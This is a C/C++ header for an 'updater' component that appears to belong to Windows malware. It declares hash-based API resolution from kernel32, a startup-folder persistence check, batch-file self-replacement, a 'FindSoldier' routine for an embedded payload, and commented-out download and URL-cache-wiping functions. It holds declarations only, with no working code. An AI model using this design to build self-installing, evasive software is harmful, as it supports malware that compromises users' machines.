#ifndef _UPDATE_H
#define _UPDATE_H

#include "winapi.h"

typedef struct _VTABLE
{
	GETPROCADDRESS GetProcAddress;
	LOADLIBRARYA LoadLibraryA;

	VIRTUALALLOC VirtualAlloc;
	VIRTUALFREE VirtualFree;

	CREATEFILEA CreateFileA;
	WRITEFILE WriteFile;
	CLOSEHANDLE CloseHandle;
	DELETEFILEA DeleteFileA;

	GETTEMPPATHA GetTempPathA;
	GETTEMPFILENAMEA GetTempFileNameA;
	GETMODULEFILENAMEA GetModuleFileNameA;
	SHGETSPECIALFOLDERPATHA SHGetSpecialFolderPathA;
	
	GETSHORTPATHNAMEA GetShortPathNameA;
	STRRCHRA StrRChrA;
	WNSPRINTFA wnsprintfA;

	SLEEP Sleep;
	EXPANDENVIRONMENTSTRINGA ExpandEnvironmentStringsA;
	CREATEPROCESSA CreateProcessA;
	EXITPROCESS ExitProcess;

	/*
	OUTPUTDEBUGSTRINGA OutputDebugStringA;
	GETFILESIZE GetFileSize;
	
	
	
	
	SHELLEXECUTEW ShellExecuteW;
	GETSHORTPATHNAMEW GetShortPathNameW;
	
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTQUERYOBJECT NtQueryObject;
	FINDFIRSTURLCACHEENTRYA FindFirstUrlCacheEntryA;
	FINDNEXTURLCACHEENTRYA FindNextUrlCacheEntryA;
	DELETEURLCACHEENTRYA DeleteUrlCacheEntryA;
	FINDCLOSEURLCACHE FindCloseUrlCache;
	URLDOWNLOADTOFILEA URLDownloadToFileA;
	SHGETSPECIALFOLDERPATHW SHGetSpecialFolderPathW;
	
	GETFILEATTRIBUTESW GetFileAttributesW;
	REGOPENKEYEXW RegOpenKeyExA;
	REGQUERYVALUEEXW RegQueryValueExA;
	DELETEFILEA DeleteFileA;
	GETURLCACHEENTRYINFOA GetUrlCacheEntryInfoA;
	INTERNETOPENA InternetOpenA;
	INTERNETOPENURLA InternetOpenUrlA;
	HTTPQUERYINFOA HttpQueryInfoA;
	INTERNETREADFILEEXA InternetReadFileExA;
//	CREATEFILEA CreateFileA;
	
	ATOI atoi;
	WCSTOMBS wcstombs;
	*/
} VTABLE, *PVTABLE;


extern "C" int Updater();
extern "C" LPBYTE FindSoldier(LPDWORD dwFileSize, LPSTR *strSoldierName);
extern "C" LPSTR GetMySelfName(__in PVTABLE lpTable);
extern "C" BOOL AmIFromStartup(__in PVTABLE lpTable);
extern "C" LPSTR GetTempDir(__in PVTABLE lpTable);
extern "C" LPSTR GetTempFile(__in PVTABLE lpTable);
extern "C" LPSTR GetStartupPath(__in PVTABLE lpTable);
extern "C" BOOL CreateReplaceBatch(__in PVTABLE lpTable, __in LPSTR strOldFile, __in LPSTR strNewFile, __out LPSTR *strBatchOutName);
extern "C" BOOL StartBatch(__in PVTABLE lpTable, __in LPSTR strName);
extern "C" DWORD GetStringHash(__in LPVOID lpBuffer, __in BOOL bUnicode, __in UINT uLen);
extern "C" HANDLE GetKernel32Handle();
extern "C" BOOL GetPointers(__out PGETPROCADDRESS fpGetProcAddress, __out PLOADLIBRARYA fpLoadLibraryA);
extern "C" BOOL GetVTable(__out PVTABLE lpTable);
extern "C" UINT __STRLEN__(__in LPSTR lpStr1);
extern "C" LPSTR __STRCAT__(__in LPSTR	strDest, __in LPSTR strSource);
extern "C" BOOL __ISUPPER__(__in CHAR c);
extern "C" CHAR __TOLOWER__(__in CHAR c);
extern "C" INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
extern "C" LPBYTE END_UPDATER();
#endif